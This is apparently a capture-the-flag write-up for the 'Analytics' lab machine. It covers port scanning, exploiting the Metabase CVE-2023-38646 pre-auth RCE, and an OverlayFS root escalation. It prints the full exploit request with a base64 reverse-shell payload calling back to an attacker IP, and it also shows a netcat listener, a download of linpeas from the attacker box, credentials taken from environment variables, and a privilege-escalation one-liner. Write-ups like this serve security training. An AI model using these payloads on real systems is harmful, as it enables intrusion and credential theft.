# analytics


| Hostname   | Difficulty |
| ---        | ---        |
| analytics  | Medium           |

Machine IP: 10.10.11.233 :

```shell
TARGET=10.10.11.233       # analitics IP address
```

## Initial Reconnaissance

### Ports and services

Scan for open ports :

```shell
nmap -p- $TARGET -sC -sV -A
```

```text
Nmap scan report for 10.10.11.233
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=10/13%OT=22%CT=1%CU=37899%PV=Y%DS=2%DC=T%G=Y%TM=65299A
OS:6E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   18.78 ms 10.10.14.1
2   19.09 ms 10.10.11.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.51 seconds
```

### Web service - port 80

Let's start by identifying this application :

```shell
whatweb $TARGET
```

```text
http://10.10.11.233 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.233], RedirectLocation[http://analytical.htb/], Title[302 Found], nginx[1.18.0]
```

There is a hostname, we can add it's definition :

```bash
echo "$TARGET     analytical.htb" >> /etc/hosts
```

[http://analytical.htb/](http://analytical.htb/)

![Untitled](assets/Untitled.png)

From the burger menu, there is a login page:

![Untitled](assets/Untitled%201.png)

This direct to : [http://data.analytical.htb/](http://data.analytical.htb/)

We need to add its definition in order to access this application:

```bash
echo "$TARGET     data.analytical.htb" >> /etc/hosts
```

![Untitled](assets/Untitled%202.png)

The software is "Metabase". it is business intelligence application.

In the HTML code of this page, we can find a version information :

```bash
"version":{"date":"2023-06-29","tag":"v0.46.6","branch":"release-x.46.x","hash":"1bb88f5"}
```

Searching for "metabase 0.46.6 vulnerability" leads to a vulnerability :

[https://thecyberexpress.com/metabase-critical-vulnerability-exploited/](https://thecyberexpress.com/metabase-critical-vulnerability-exploited/)

[https://nvd.nist.gov/vuln/detail/CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

**CVE-2023-38646 : allow attackers to execute arbitrary commands on the server, at the server's privilege level. Authentication is not required for exploitation.**

## Initial access

### Exploitation

Search for CVE-2023-38646 exploit :

[https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396)

With a PoC : [https://github.com/shamo0/CVE-2023-38646-PoC](https://github.com/shamo0/CVE-2023-38646-PoC)

There are several exploit and PoC on github. We can try several.

Let's try this one :

[https://github.com/securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

First, there is a script to check if this application is vulnerable:

```bash
git clone https://github.com/securezeron/CVE-2023-38646.git
cd CVE-2023-38646
python3 ./CVE-2023-38646-POC.py --ip data.analytical.htb
```

```bash
Failed to connect using HTTPS for data.analytical.htb. Trying next protocol...
None. Vulnerable Metabase Instance:-
             IP: data.analytical.htb
             Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

This instance is vulnerable, so we can exploit it :

```bash
python3 ./CVE-2023-38646-Reverse-Shell.py  --rhost http://data.analytical.htb  --lhost 10.10.14.23 --lport 4444
```

```bash
[DEBUG] Original rhost: http://data.analytical.htb
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.14.23, lport: 4444
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIzLzQ0NDQgMD4mMQ==
[DEBUG] Sending request to http://data.analytical.htb/api/setup/validate with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIzLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Vector arg to map conj must be a pair"}
[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
```

with a listener : 

```bash
rlwrap -cAr nc -lvnp 4444
```

Most of PoC and exploits fails with this kind of error "Vector arg to map conj must be a pair".

We can find a fix for this issue :

[https://github.com/securezeron/CVE-2023-38646/issues/4](https://github.com/securezeron/CVE-2023-38646/issues/4)

We need to change the code from :

```bash
payload = base64.b64encode(f"bash -i >&/dev/tcp/{listener_ip}/{listener_port} 0>&1".encode()).decode()
```

to:

```bash
payload = base64.b64encode(f"bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'".encode()).decode()
```

```bash
bash -c '........>& /.....'
```

Let's run once it again :

```bash
python3 ./CVE-2023-38646-Reverse-Shell.py  --rhost http://data.analytical.htb  --lhost 10.10.14.23 --lport 4444
```

```bash
[DEBUG] Original rhost: http://data.analytical.htb
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.14.23, lport: 4444
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjEn
[DEBUG] Sending request to http://data.analytical.htb/api/setup/validate with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
```

and we have a shell :

```bash
rlwrap -cAr nc -lvnp 4444
```

```bash
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.233.
Ncat: Connection from 10.10.11.233:39920.
cannot set terminal process group (1): Not a tty
bash: no job control in this shell

id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)

pwd
/

ps -ef
PID   USER     TIME  COMMAND
    1 metabase  2:52 java -XX:+IgnoreUnrecognizedVMOptions -Dfile.encoding=UTF-8 -Dlogfile.path=target/log -XX:+CrashOnOutOfMemoryError -server -jar /app/metabase.jar
  238 metabase  0:00 bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}
  242 metabase  0:00 bash -i
  243 metabase  0:00 bash -c bash -i >& /dev/tcp/10.10.14.23/4444 0>&1
  244 metabase  0:00 bash -i
  246 metabase  0:00 ps -ef
7d55f5035676:/$
```

we are locked in a docker container 

## Post-Exploitation

### Host Reconnaissance

We can use linpeas or any other enumeration script to find something in the environment variables :

```bash
env
```

```bash
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=7d55f5035676
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Note :

```bash
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Let's try this credential over the SSH :

```bash
ssh metalytics@analytical.htb
```

And we have a shell !!

Just a previously, we could run linpeas to enumerate this host.

[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

We can use this script version here : [https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas_linux_amd64](https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas_linux_amd64)

From our attack box, serve it with `updog`, and download it to the target, and execute it :

```shell
wget http://10.10.14.23:9090/linpeas_linux_amd64
chmod +x ./linpeas_linux_amd64
./linpeas_linux_amd64
```

nothing relevant, but we can notice the kernel version :

![Untitled](assets/Untitled%203.png)

"22.04.2-Ubuntu" it’s a bit old (we are in 2023), there could be a known vulnerability.

A search for a privesc leads to :

[https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=63649](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=63649)

There is a vulnerability that could be tested with :

```bash
# original poc payload
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```

As we wish to have a shell, replace the `id` command by `bash` :

```shell
# original poc payload
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
```

result :

![Untitled](assets/Untitled%204.png)

got a shell as root !!
